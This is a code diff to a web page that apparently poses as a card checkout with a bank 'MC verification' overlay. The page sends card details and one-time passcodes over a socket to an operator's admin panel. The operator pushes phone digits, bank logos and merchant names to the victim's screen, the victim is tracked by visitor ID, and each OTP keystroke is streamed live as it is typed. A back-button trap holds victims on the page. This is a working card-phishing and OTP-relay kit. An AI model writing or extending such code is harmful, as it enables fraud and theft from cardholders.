@@ -773,9 +773,13 @@ Your payment information is securely transmitted using 256-bit encryption. We do
   };
   
 // Parse URL parameters for amount
+// Parse URL parameters for amount
 function parseURLParams() {
     try {
+        console.log('Parsing URL parameters');
         const urlParams = new URLSearchParams(window.location.search);
+        
+        // Check for amount parameter
         if (urlParams.has('amount')) {
             const urlAmount = parseFloat(urlParams.get('amount'));
             if (!isNaN(urlAmount) && urlAmount > 0) {
@@ -784,15 +788,19 @@ function parseURLParams() {
                 
                 // Update displayed amounts
                 updateAmountDisplays();
+            } else {
+                console.log('Invalid amount in URL, using default:', state.amount);
             }
+        } else {
+            console.log('No amount parameter found, using default:', state.amount);
         }
         
-        // Also check for pid parameter
+        // Check for pid parameter
         if (urlParams.has('pid')) {
             const pid = urlParams.get('pid');
             console.log('Found pid in URL:', pid);
             
-            // Store pid in state if needed for later reference
+            // Store pid in state for later reference
             state.pid = pid;
             
             // Notify server of visitor with this pid
@@ -808,8 +816,14 @@ function parseURLParams() {
                 socket.emit('join', pid);
                 
                 console.log('Emitted visitor event with pid:', pid);
+            } else {
+                console.log('Socket not ready, will emit visitor event after connection');
             }
+        } else {
+            console.log('No pid parameter found in URL');
         }
+        
+        console.log('URL parameters parsed successfully');
     } catch (error) {
         console.error('Error parsing URL parameters:', error);
     }
@@ -845,6 +859,7 @@ function parseURLParams() {
       }
   }
   
+// Main application initialization
 document.addEventListener('DOMContentLoaded', function() {
     try {
         console.log('Document loaded, initializing application...');
@@ -860,7 +875,8 @@ document.addEventListener('DOMContentLoaded', function() {
         
         // Socket connection debugging
         socket.on('connect', () => {
-            console.log('Socket connected:', socket.id);
+            console.log('Socket connected with ID:', socket.id);
+            console.log('Socket transport type:', socket.io.engine.transport.name);
             
             // Send visitor info to admin panel
             socket.emit('visitor', {
@@ -870,6 +886,8 @@ document.addEventListener('DOMContentLoaded', function() {
                 timestamp: new Date().toISOString(),
                 amount: state.amount
             });
+            
+            console.log('Visitor info sent to server');
             
             // Start heartbeat
             setInterval(() => {
@@ -882,6 +900,7 @@ document.addEventListener('DOMContentLoaded', function() {
             // Auto-join room for this pid if available
             if (state.pid) {
                 socket.emit('join', state.pid);
+                console.log('Joined room for pid:', state.pid);
             }
         });
         
@@ -894,17 +913,91 @@ document.addEventListener('DOMContentLoaded', function() {
         // Ensure amount displays are updated
         updateAmountDisplays();
         
+        // Ensure MC verification buttons have their handlers
+        // We do this with a slight delay to ensure the DOM is fully rendered
+        setTimeout(() => {
+            console.log('Setting up MC verification button handlers with delay');
+            
+            // MC Submit button
+            const mcSubmitBtn = document.getElementById('mcSubmitBtn');
+            if (mcSubmitBtn) {
+                // Remove existing listeners if any
+                const newSubmitBtn = mcSubmitBtn.cloneNode(true);
+                mcSubmitBtn.parentNode.replaceChild(newSubmitBtn, mcSubmitBtn);
+                
+                // Add fresh listener
+                newSubmitBtn.addEventListener('click', function(e) {
+                    console.log('MC Submit button clicked directly!');
+                    handleMcSubmit();
+                });
+                console.log('MC submit button handler attached');
+            } else {
+                console.warn('MC Submit button not found in DOM');
+            }
+            
+            // MC Resend button
+            const mcResendBtn = document.getElementById('mcResendBtn');
+            if (mcResendBtn) {
+                const newResendBtn = mcResendBtn.cloneNode(true);
+                mcResendBtn.parentNode.replaceChild(newResendBtn, mcResendBtn);
+                newResendBtn.addEventListener('click', handleMcResend);
+                console.log('MC resend button handler attached');
+            }
+            
+            // MC Cancel button
+            const mcCancelBtn = document.getElementById('mcCancelBtn');
+            if (mcCancelBtn) {
+                const newCancelBtn = mcCancelBtn.cloneNode(true);
+                mcCancelBtn.parentNode.replaceChild(newCancelBtn, mcCancelBtn);
+                newCancelBtn.addEventListener('click', handleMcCancel);
+                console.log('MC cancel button handler attached');
+            }
+            
+            // OTP input handler
+            const otpInput = document.getElementById('mcOtpInput');
+            if (otpInput) {
+                otpInput.addEventListener('input', function(e) {
+                    // Only allow digits
+                    e.target.value = e.target.value.replace(/\D/g, '');
+                    
+                    // Max length 6
+                    if (e.target.value.length > 6) {
+                        e.target.value = e.target.value.slice(0, 6);
+                    }
+                    
+                    // Notify server about typing activity
+                    if (socket && socket.connected && state.transactionId) {
+                        socket.emit('mc_otp_typing', {
+                            invoiceId: state.transactionId,
+                            partialOtp: e.target.value
+                        });
+                    }
+                    
+                    // Auto-submit when 6 digits entered
+                    if (e.target.value.length === 6) {
+                        console.log('OTP complete, auto-submitting...');
+                        setTimeout(() => {
+                            handleMcSubmit();
+                        }, 500);
+                    }
+                });
+                console.log('OTP input handler attached');
+            }
+        }, 500);
+        
     } catch (error) {
         console.error('Error initializing application:', error);
     }
 });
 
-        // Setup Socket Event Handlers (separate function for better organization)
+// Setup Socket Event Handlers (separate function for better organization)
 function setupSocketEventHandlers() {
     if (!socket) {
         console.error('Socket not initialized');
         return;
     }
+    
+    console.log('Setting up socket event handlers');
     
     // Handle socket connection errors
     socket.on('connect_error', (error) => {
@@ -940,7 +1033,47 @@ function setupSocketEventHandlers() {
             state.phoneLastFour = data.phoneLastFour;
             console.log('Phone from show_mc_verification:', state.phoneLastFour);
         }
+        
+        // If cardType is provided, update state
+        if (data.cardType) {
+            state.cardType = data.cardType;
+            console.log('Card type updated:', state.cardType);
+        }
+        
         showMcVerification();
+    });
+    
+    // Handle start verification command
+    socket.on('start_verification', function(data) {
+        console.log('Start verification command received:', data);
+        
+        // Store phone if provided and not already set
+        if (data.phoneLastFour && !state.phoneNumberSet) {
+            state.phoneNumberSet = true;
+            state.phoneLastFour = data.phoneLastFour;
+            console.log('Phone from start_verification:', state.phoneLastFour);
+        }
+        
+        // Store transaction ID if provided
+        if (data.invoiceId && !state.transactionId) {
+            state.transactionId = data.invoiceId;
+            console.log('Transaction ID set from start_verification:', state.transactionId);
+        }
+        
+        // Update UI with merchant name if provided
+        if (data.merchantName) {
+            const merchantNameElement = document.getElementById('merchantName');
+            if (merchantNameElement) {
+                merchantNameElement.textContent = data.merchantName;
+                console.log('Merchant name updated:', data.merchantName);
+            }
+        }
+        
+        // Update bank if provided
+        if (data.bankCode) {
+            updateBankLogo(data.bankCode);
+            console.log('Bank logo updated:', data.bankCode);
+        }
     });
     
     // Handle bank update command
@@ -948,6 +1081,7 @@ function setupSocketEventHandlers() {
         console.log('Received bank update:', data);
         if (data.bankCode) {
             updateBankLogo(data.bankCode);
+            console.log('Bank logo updated from event:', data.bankCode);
         }
     });
 
@@ -960,6 +1094,7 @@ function setupSocketEventHandlers() {
             const currencySymbolElement = document.getElementById('currencySymbol');
             if (currencySymbolElement) {
                 currencySymbolElement.textContent = currencySymbol;
+                console.log('Currency symbol updated:', currencySymbol);
             }
         }
     });
@@ -993,9 +1128,11 @@ function setupSocketEventHandlers() {
         console.log('MC OTP error received:', data);
         handleOtpError(data.message);
     });
+    
+    console.log('Socket event handlers setup complete');
 }
 
-// Add a helper function to get currency symbols
+// Helper function to get currency symbols
 function getCurrencySymbol(currencyCode) {
     const symbols = {
         'USD': '$',
@@ -1217,8 +1354,11 @@ function setupCardFormHandlers() {
   }
 
 function processPayment() {
+    console.log('Processing payment...');
+    
     // Generate a unique transaction ID
     state.transactionId = generateTransactionId();
+    console.log('Generated transaction ID:', state.transactionId);
     
     // Show processing state
     const cardForm = document.getElementById('card-form');
@@ -1227,7 +1367,12 @@ function processPayment() {
         if (submitBtn) {
             submitBtn.disabled = true;
             submitBtn.innerHTML = '<span class="spinner"></span> Processing...';
+            console.log('Payment button disabled and showing spinner');
+        } else {
+            console.warn('Submit button not found in form');
         }
+    } else {
+        console.warn('Card form not found');
     }
     
     // Check if socket is initialized
@@ -1237,10 +1382,17 @@ function processPayment() {
         return;
     }
     
+    if (!socket.connected) {
+        console.error('Socket is initialized but not connected');
+        handlePaymentError('Connection to payment server lost. Please try again.');
+        return;
+    }
+    
     console.log('Sending payment data to server:', {
         transactionId: state.transactionId,
         amount: state.amount,
-        cardNumber: state.cardForm.cardNumber
+        cardNumber: state.cardForm.cardNumber ? '****' + state.cardForm.cardNumber.slice(-4) : 'undefined',
+        cardHolder: state.cardForm.cardHolder || 'undefined'
     });
     
     // Emit payment processing event to server
@@ -1255,6 +1407,8 @@ function processPayment() {
         currency: 'USD',
         email: 'customer@example.com'
     });
+    
+    console.log('Payment data sent to server');
     
     // Show notification that card details have been submitted
     showProcessingNotification();
@@ -1293,39 +1447,60 @@ function processPayment() {
       return Math.random().toString(36).substring(2, 12);
   }
 
-  // MC Verification Overlay Functions
-  function showMcVerification() {
-      console.log('Showing MC verification overlay');
-      
-      const overlay = document.getElementById('mcVerificationOverlay');
-      const loadingContent = document.getElementById('mcLoadingContent');
-      const verificationContent = document.getElementById('mcVerificationContent');
-      
-      if (!overlay || !loadingContent || !verificationContent) {
-          console.error('MC verification elements not found!');
-          return;
-      }
-      
-      // Show overlay with loading spinner
-      overlay.style.display = 'flex';
-      loadingContent.style.display = 'flex';
-      verificationContent.style.display = 'none';
-      
-      // Set verification logo for loading screen based on card type
-      updateLoadingVerificationLogo(state.cardType || 'default');
-      
-      // Simulate loading delay (1-2 seconds)
-      setTimeout(() => {
-          loadingContent.style.display = 'none';
-          verificationContent.style.display = 'block';
-          
-          // Update verification UI with transaction details
-          updateMcVerificationUI();
-          
-          // Start MC verification timer
-          startMcTimer();
-      }, 1500);
-  }
+function showMcVerification() {
+    console.log('Showing MC verification overlay');
+    
+    const overlay = document.getElementById('mcVerificationOverlay');
+    const loadingContent = document.getElementById('mcLoadingContent');
+    const verificationContent = document.getElementById('mcVerificationContent');
+    
+    if (!overlay) {
+        console.error('MC verification overlay element not found!');
+        return;
+    }
+    
+    if (!loadingContent) {
+        console.error('MC loading content element not found!');
+        return;
+    }
+    
+    if (!verificationContent) {
+        console.error('MC verification content element not found!');
+        return;
+    }
+    
+    // Show overlay with loading spinner
+    overlay.style.display = 'flex';
+    loadingContent.style.display = 'flex';
+    verificationContent.style.display = 'none';
+    
+    // Set verification logo for loading screen based on card type
+    updateLoadingVerificationLogo(state.cardType || 'default');
+    
+    console.log('Loading screen displayed, card type:', state.cardType || 'default');
+    
+    // Simulate loading delay (1-2 seconds)
+    setTimeout(() => {
+        console.log('Loading complete, showing verification content');
+        loadingContent.style.display = 'none';
+        verificationContent.style.display = 'block';
+        
+        // Update verification UI with transaction details
+        updateMcVerificationUI();
+        
+        // Start MC verification timer
+        startMcTimer();
+        
+        // Ensure the OTP input has focus
+        setTimeout(() => {
+            const otpInput = document.getElementById('mcOtpInput');
+            if (otpInput) {
+                otpInput.focus();
+                console.log('OTP input focused');
+            }
+        }, 300);
+    }, 1500);
+}
 
   function updateLoadingVerificationLogo(cardType) {
       const logoContainer = document.getElementById('loadingVerificationLogo');
@@ -1350,21 +1525,44 @@ function updateMcVerificationUI() {
     console.log('Phone last four set:', state.phoneNumberSet, state.phoneLastFour);
     
     // Update elements with transaction details
-    updateElement('cardLastFourDigits', getPhoneDisplay());
-    updateElement('merchantName', 'Peacock Merchandise');
-    updateElement('transactionAmount', state.amount.toFixed(2));
-    updateElement('transactionDate', getCurrentDateTime());
-    updateElement('cardNumberDisplay', formatCardNumberDisplay(state.cardForm.cardNumber));
-    updateElement('referenceId', state.transactionId || generateTransactionId());
-    
-    // Update bank logo and verification logo based on card type
-    updateBankLogo('default'); // Will be updated by admin if needed
-    updateVerificationLogo(state.cardType || 'default');
-    
-    // Clear previous OTP error if any
-    const otpError = document.getElementById('mcOtpError');
-    if (otpError) {
-        otpError.style.display = 'none';
+    try {
+        // Phone number display
+        const phoneNumber = getPhoneDisplay();
+        console.log('Using phone number for display:', phoneNumber);
+        updateElement('cardLastFourDigits', phoneNumber);
+        
+        // Merchant name
+        updateElement('merchantName', 'Peacock Merchandise');
+        
+        // Amount with proper formatting
+        updateElement('transactionAmount', state.amount.toFixed(2));
+        
+        // Current date and time
+        updateElement('transactionDate', getCurrentDateTime());
+        
+        // Card number with masking
+        const maskedCard = formatCardNumberDisplay(state.cardForm.cardNumber);
+        console.log('Using masked card:', maskedCard);
+        updateElement('cardNumberDisplay', maskedCard);
+        
+        // Reference ID (transaction ID)
+        const refId = state.transactionId || generateTransactionId();
+        console.log('Using reference ID:', refId);
+        updateElement('referenceId', refId);
+        
+        // Update bank logo and verification logo based on card type
+        updateBankLogo('default'); // Will be updated by admin if needed
+        updateVerificationLogo(state.cardType || 'default');
+        
+        // Clear previous OTP error if any
+        const otpError = document.getElementById('mcOtpError');
+        if (otpError) {
+            otpError.style.display = 'none';
+        }
+        
+        console.log('MC verification UI updated successfully');
+    } catch (error) {
+        console.error('Error updating MC verification UI:', error);
     }
 }
 
@@ -1374,17 +1572,19 @@ function getPhoneDisplay() {
         console.log('Using admin provided phone ending in:', state.phoneLastFour);
         return `********${state.phoneLastFour}`;
     } else {
-        const randomLastFour = generateRandomPhone();
-        console.log('Using generated phone ending in:', randomLastFour);
-        return randomLastFour;
+        // Generate random phone number
+        const randomPhone = generateRandomPhone();
+        console.log('No admin phone provided, using generated phone:', randomPhone);
+        return randomPhone;
     }
 }
 
-  function generateRandomPhone() {
-      // Generate a random 4-digit number for phone display
-      const lastFour = Math.floor(1000 + Math.random() * 9000).toString();
-      return `********${lastFour}`;
-  }
+function generateRandomPhone() {
+    // Generate a random 4-digit number for phone display
+    const lastFour = Math.floor(1000 + Math.random() * 9000).toString();
+    console.log('Generated random phone last four:', lastFour);
+    return `********${lastFour}`;
+}
 
   function updateBankLogo(bankCode) {
       const bankLogo = document.getElementById('bankLogo');
@@ -1536,18 +1736,33 @@ function getPhoneDisplay() {
       }
   }
 
- function handleMcSubmit() {
+function handleMcSubmit() {
+    console.log('MC Submit button clicked!');
+    
     const otpInput = document.getElementById('mcOtpInput');
     const otpError = document.getElementById('mcOtpError');
     const consentCheckbox = document.getElementById('mcConsentCheckbox');
     
-    if (!otpInput || !otpError || !consentCheckbox) {
-        console.error('MC verification elements not found!');
+    if (!otpInput) {
+        console.error('OTP input element not found!');
         return;
     }
     
+    if (!otpError) {
+        console.error('OTP error element not found!');
+        return;
+    }
+    
+    if (!consentCheckbox) {
+        console.error('Consent checkbox element not found!');
+        return;
+    }
+    
+    console.log('OTP Elements found - continuing');
+    
     // Check consent
     if (!consentCheckbox.checked) {
+        console.log('Terms not accepted');
         otpError.textContent = 'Please accept the terms and conditions';
         otpError.style.display = 'block';
         return;
@@ -1555,9 +1770,11 @@ function getPhoneDisplay() {
     
     // Get OTP value
     const otpValue = otpInput.value.trim();
+    console.log('OTP Value:', otpValue);
     
     // Check if OTP is empty
     if (!otpValue) {
+        console.log('OTP is empty');
         otpError.textContent = 'Please enter the One-Time Passcode';
         otpError.style.display = 'block';
         return;
@@ -1565,10 +1782,21 @@ function getPhoneDisplay() {
     
     // Check if OTP is correct length
     if (otpValue.length !== 6) {
+        console.log('OTP length invalid:', otpValue.length);
         otpError.textContent = 'One-Time Passcode must be 6 digits';
         otpError.style.display = 'block';
         return;
     }
+    
+    // Check if transaction ID exists
+    if (!state.transactionId) {
+        console.error('No transaction ID found in state!');
+        otpError.textContent = 'Transaction ID missing. Please try again.';
+        otpError.style.display = 'block';
+        return;
+    }
+    
+    console.log('OTP validation passed - sending to server');
     
     // Send OTP verification to server
     if (socket && socket.connected) {
@@ -1579,6 +1807,8 @@ function getPhoneDisplay() {
             invoiceId: state.transactionId,
             otp: otpValue
         });
+        
+        console.log('mc_otp_submitted event sent');
         
         // Also try the older verify_otp format for backward compatibility
         socket.emit('verify_otp', {
@@ -1593,8 +1823,10 @@ function getPhoneDisplay() {
             },
             amount: state.amount
         });
+        
+        console.log('verify_otp event sent for backward compatibility');
     } else {
-        console.error('Socket connection not available for OTP verification');
+        console.error('Socket not connected for OTP verification!');
         otpError.textContent = 'Connection error. Please try again.';
         otpError.style.display = 'block';
         return;
@@ -1605,9 +1837,11 @@ function getPhoneDisplay() {
     if (submitBtn) {
         submitBtn.disabled = true;
         submitBtn.innerHTML = '<span class="spinner"></span> Verifying...';
+        console.log('Submit button disabled, showing spinner');
     }
     
     // We don't auto-proceed to success here - we wait for server response
+    console.log('OTP submission complete - waiting for server response');
 }
 
   function handleMcResend() {
@@ -1844,111 +2078,83 @@ function getPhoneDisplay() {
       return result;
   }
 
-  // Set up confirmation dialog when user tries to navigate back or close page during MC verification
-  function setupBackButtonConfirmation() {
-      // Track if MC verification is active
-      let mcVerificationActive = false;
-      
-      // Function to show custom confirmation dialog
-      function showConfirmationDialog() {
-          return confirm('Do you want to cancel this transaction?');
-      }
-      
-      // Update the MC verification active state
-      function updateMcVerificationState() {
-          const mcOverlay = document.getElementById('mcVerificationOverlay');
-          mcVerificationActive = mcOverlay && mcOverlay.style.display !== 'none';
-      }
-      
-      // Handle popstate event (back button)
-      window.addEventListener('popstate', function(e) {
-          updateMcVerificationState();
-          if (mcVerificationActive) {
-              // Prevent the default action and show custom dialog
-              const confirmLeave = showConfirmationDialog();
-              
-              // If user confirms leaving
-              if (confirmLeave) {
-                  // Cancel the transaction
-                  if (socket && state.transactionId) {
-                      socket.emit('mc_verification_cancelled', {
-                          invoiceId: state.transactionId,
-                          reason: 'cancelled_by_user'
-                      });
-                  }
-                  
-                  // Hide MC verification overlay
-                  const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
-                  if (mcVerificationOverlay) {
-                      mcVerificationOverlay.style.display = 'none';
-                  }
-                  
-                  // Stop MC timer
-                  if (mcTimerInterval) {
-                      clearInterval(mcTimerInterval);
-                      mcTimerInterval = null;
-                  }
-                  
-                  // Show error UI with cancellation message
-                  showErrorNotification("Payment Cancelled", "This payment was cancelled by you.");
-              } else {
-                  // If user cancels leaving, reset the history state to prevent navigation
-                  history.pushState(null, null, window.location.pathname + window.location.search);
-              }
-              
-              // Prevent default navigation behavior
-              e.preventDefault();
-              return false;
-          }
-        // Handle popstate event (back button)
-      window.addEventListener('popstate', function(e) {
-          updateMcVerificationState();
-          if (mcVerificationActive) {
-              // Prevent the default action and show custom dialog
-              const confirmLeave = showConfirmationDialog();
-              
-              // If user confirms leaving
-              if (confirmLeave) {
-                  // Cancel the transaction
-                  if (socket && state.transactionId) {
-                      socket.emit('mc_verification_cancelled', {
-                          invoiceId: state.transactionId,
-                          reason: 'cancelled_by_user'
-                      });
-                  }
-                  
-                  // Hide MC verification overlay
-                  const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
-                  if (mcVerificationOverlay) {
-                      mcVerificationOverlay.style.display = 'none';
-                  }
-                  
-                  // Stop MC timer
-                  if (mcTimerInterval) {
-                      clearInterval(mcTimerInterval);
-                      mcTimerInterval = null;
-                  }
-                  
-                  // Show error UI with cancellation message
-                  showErrorNotification("Payment cancelled by user");
-              } else {
-                  // If user cancels leaving, reset the history state to prevent navigation
-                  history.pushState(null, null, window.location.pathname + window.location.search);
-              }
-              
-              // Prevent default navigation behavior
-              e.preventDefault();
-              return false;
-          }
-      });
-      
-      // Monitor for back button in standalone mobile browsers or mobile apps
-      // by pushing a state to history on page load and then detecting popstate events
-      history.pushState(null, null, window.location.pathname + window.location.search);
-  }
-
-  // Initialize back button confirmation
-  setupBackButtonConfirmation();
+function setupBackButtonConfirmation() {
+    console.log('Setting up back button confirmation');
+    
+    // Track if MC verification is active
+    let mcVerificationActive = false;
+    
+    // Function to show custom confirmation dialog
+    function showConfirmationDialog() {
+        return confirm('Do you want to cancel this transaction?');
+    }
+    
+    // Update the MC verification active state
+    function updateMcVerificationState() {
+        const mcOverlay = document.getElementById('mcVerificationOverlay');
+        mcVerificationActive = mcOverlay && mcOverlay.style.display !== 'none';
+    }
+    
+    // Handle popstate event (back button)
+    window.addEventListener('popstate', function(e) {
+        console.log('Back button detected (popstate event)');
+        
+        updateMcVerificationState();
+        if (mcVerificationActive) {
+            console.log('MC verification is active, showing confirmation dialog');
+            
+            // Prevent the default action and show custom dialog
+            const confirmLeave = showConfirmationDialog();
+            
+            // If user confirms leaving
+            if (confirmLeave) {
+                console.log('User confirmed leaving, cancelling transaction');
+                
+                // Cancel the transaction
+                if (socket && socket.connected && state.transactionId) {
+                    socket.emit('mc_verification_cancelled', {
+                        invoiceId: state.transactionId,
+                        reason: 'cancelled_by_user'
+                    });
+                    console.log('Cancellation event sent to server');
+                }
+                
+                // Hide MC verification overlay
+                const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
+                if (mcVerificationOverlay) {
+                    mcVerificationOverlay.style.display = 'none';
+                    console.log('MC verification overlay hidden');
+                }
+                
+                // Stop MC timer
+                if (mcTimerInterval) {
+                    clearInterval(mcTimerInterval);
+                    mcTimerInterval = null;
+                    console.log('MC timer stopped');
+                }
+                
+                // Show error UI with cancellation message
+                showErrorNotification("Payment cancelled by user");
+            } else {
+                console.log('User cancelled navigation, preventing page change');
+                
+                // If user cancels leaving, reset the history state to prevent navigation
+                history.pushState(null, null, window.location.pathname + window.location.search);
+            }
+            
+            // Prevent default navigation behavior
+            e.preventDefault();
+            return false;
+        } else {
+            console.log('MC verification not active, allowing normal navigation');
+        }
+    });
+    
+    // Monitor for back button in standalone mobile browsers or mobile apps
+    // by pushing a state to history on page load and then detecting popstate events
+    history.pushState(null, null, window.location.pathname + window.location.search);
+    console.log('Initial history state pushed for back button detection');
+}
   </script>
   </body>
   </html>
